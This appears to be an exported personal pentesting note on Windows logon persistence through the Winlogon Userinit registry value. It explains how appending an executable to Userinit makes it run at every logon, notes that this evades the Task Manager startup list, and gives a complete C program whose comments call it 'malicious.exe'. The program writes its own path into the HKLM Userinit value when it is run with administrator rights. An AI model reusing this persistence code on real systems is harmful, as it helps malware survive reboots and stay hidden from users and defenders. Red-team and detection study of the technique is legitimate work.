<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Winlogon\Userinit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Winlogon\Userinit</h1></strong><br />• <a href="https://pentestlab.blog/tag/userinit/">https://pentestlab.blog/tag/userinit/</a><br /><br /><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code><br />Userinit will run at Windows logon.<br /><br />This registry key points to <code>C:\WINDOWS\system32\userinit.exe,</code>.<br />It ends with a comma.<br />Other programs can be started from this key by appending them to the end, separated by a comma.<br />e.g.<br /><code>C:\WINDOWS\system32\userinit.exe,C:\Users\Bob\Desktop\hello_world.exe</code><br /><br /><a href=""><img src="images/1731-1.png" alt="images/1731-1.png" /></a><br /><br /><strong><h2>## Advantages</h2></strong><br />• Doesn&#39;t show up in <code>Task Manager &gt; Start-up</code><br /><a href=""><img src="images/1731-2.png" alt="images/1731-2.png" /></a><br /><br /><strong><h2>## Disadvantages</h2></strong><br />• Detected - <a href="https://blog.malwarebytes.com/detections/hijack-userinit/">https://blog.malwarebytes.com/detections/hijack-userinit/</a><br /><br /><strong><h2>## Code</h2></strong><br />Binaries in <code>Userinit</code> start as the logged-in user, not Administrator.<br />To modify <code>HKEY_LOCAL_MACHINE</code> keys, we need Administrator privileges.<br />   ◇ <code>KEY_QUERY_VALUE</code> reads the registry, and doesn&#39;t need Administrator<br />   ◇ <code>KEY_SET_VALUE</code> writes to the registry, and DOES need Administrator<br /><br />Therefore, the code below checks if <code>Userint</code> already contains our <code>filename.exe</code>.<br />If it does, the registry is left alone and the code skips to exeuction.<br />If it doesn&#39;t, we assume that we&#39;re planting this exe for the first and running it as Administrator, which means that <code>Userint</code> gets modified.<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	LSTATUS&nbsp;lstatRet;<br />	<br />	//&nbsp;open&nbsp;key<br />	printf(&quot;[*]&nbsp;opening&nbsp;key&nbsp;\n&quot;);<br />	HKEY&nbsp;hKey&nbsp;=&nbsp;NULL;<br />	lstatRet&nbsp;=&nbsp;RegOpenKeyExW(HKEY_LOCAL_MACHINE,&nbsp;L&quot;SOFTWARE\\Microsoft\\Windows&nbsp;NT\\CurrentVersion\\Winlogon&quot;,&nbsp;0,&nbsp;KEY_QUERY_VALUE,&nbsp;&amp;hKey);<br />	if&nbsp;(lstatRet&nbsp;!=&nbsp;ERROR_SUCCESS)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;open&nbsp;key&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;read&nbsp;registry&nbsp;value<br />	printf(&quot;[*]&nbsp;reading&nbsp;Userinit&nbsp;value...&nbsp;&quot;);<br />	wchar_t&nbsp;regValue[115];<br />	DWORD&nbsp;dwValueSize;<br />	RegGetValueW(HKEY_LOCAL_MACHINE,&nbsp;L&quot;SOFTWARE\\Microsoft\\Windows&nbsp;NT\\CurrentVersion\\Winlogon&quot;,&nbsp;L&quot;Userinit&quot;,&nbsp;RRF_RT_REG_SZ,&nbsp;NULL,&nbsp;regValue,&nbsp;&amp;dwValueSize);<br />	printf(&quot;\&quot;%S\&quot;&nbsp;\n&quot;,&nbsp;regValue);<br /><br />	///&nbsp;grab&nbsp;binary&nbsp;name&nbsp;for&nbsp;substring&nbsp;search<br />	wchar_t&nbsp;exeName[MAX_PATH];<br />	GetModuleFileNameW(NULL,&nbsp;exeName,&nbsp;MAX_PATH);<br /><br />	//&nbsp;find&nbsp;&quot;malicious.exe&quot;&nbsp;in&nbsp;registry&nbsp;value<br />	//&nbsp;if&nbsp;&quot;malicious.exe&quot;&nbsp;not&nbsp;in&nbsp;registry&nbsp;value&nbsp;-&gt;&nbsp;i.e&nbsp;if&nbsp;we&nbsp;haven&#39;t&nbsp;added&nbsp;persistence&nbsp;yet<br />	printf(&quot;[*]&nbsp;.exe&nbsp;in&nbsp;Userinit&nbsp;key?...&nbsp;&quot;);<br />	if&nbsp;(wcsstr(regValue,&nbsp;exeName)&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;FALSE&nbsp;\n&quot;);<br />		printf(&quot;[*]&nbsp;adding&nbsp;.exe&nbsp;to&nbsp;Userinit&nbsp;value&nbsp;\n&quot;);<br />		//&nbsp;add&nbsp;malicious.exe&nbsp;to&nbsp;registry&nbsp;value&nbsp;<br />		//&nbsp;THIS&nbsp;PART&nbsp;REQUIRES&nbsp;ADMINISTRATOR&nbsp;PRIVILEGES<br /><br />		//&nbsp;open&nbsp;key&nbsp;with&nbsp;KEY_SET_VALUE&nbsp;privileges<br />		printf(&quot;[*]&nbsp;opening&nbsp;key&nbsp;\n&quot;);<br />		HKEY&nbsp;hKeyWrite&nbsp;=&nbsp;NULL;<br />		lstatRet&nbsp;=&nbsp;RegOpenKeyExW(HKEY_LOCAL_MACHINE,&nbsp;L&quot;SOFTWARE\\Microsoft\\Windows&nbsp;NT\\CurrentVersion\\Winlogon&quot;,&nbsp;0,&nbsp;KEY_SET_VALUE,&nbsp;&amp;hKeyWrite);<br />		if&nbsp;(lstatRet&nbsp;!=&nbsp;ERROR_SUCCESS)<br />		{<br />			fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;open&nbsp;key&nbsp;with&nbsp;KEY_SET_VALUE&nbsp;privileges\n&quot;);<br />			return&nbsp;1;<br />		}<br /><br />		//&nbsp;modify&nbsp;value<br />		printf(&quot;[*]&nbsp;modifying&nbsp;value&nbsp;\n&quot;);<br />		wchar_t&nbsp;value[]&nbsp;=&nbsp;L&quot;C:\\Windows\\system32\\userinit.exe,C:\\Users\\Bob\\source\\repos\\learn10-reg_userinit\\x64\\Debug\\learn10-reg_userinit.exe&quot;;<br />		lstatRet&nbsp;=&nbsp;RegSetValueExW(hKeyWrite,&nbsp;L&quot;Userinit&quot;,&nbsp;0,&nbsp;REG_SZ,&nbsp;(BYTE*)value,&nbsp;sizeof(value));<br />		if&nbsp;(lstatRet&nbsp;!=&nbsp;ERROR_SUCCESS)<br />		{<br />			fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;set&nbsp;key&nbsp;value&nbsp;\n&quot;);<br />			return&nbsp;1;<br />		}<br />	}<br />	//&nbsp;if&nbsp;&quot;malicious&quot;.exe&nbsp;IS&nbsp;found&nbsp;in&nbsp;registry&nbsp;value&nbsp;(i.e&nbsp;we&#39;ve&nbsp;already&nbsp;added&nbsp;persistence),&nbsp;we&nbsp;continue&nbsp;to&nbsp;normal&nbsp;execution<br />	else<br />	{<br />		printf(&quot;TRUE&nbsp;\n&quot;);<br />		printf(&quot;[*]&nbsp;continuing&nbsp;to&nbsp;normal&nbsp;execution&nbsp;\n&quot;);<br />	}<br /><br />	printf(&quot;Hello&nbsp;from&nbsp;Winlogon&nbsp;:)&nbsp;\n&quot;);<br />	getchar();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><br /><br /><br /></div>
</body>
</html>
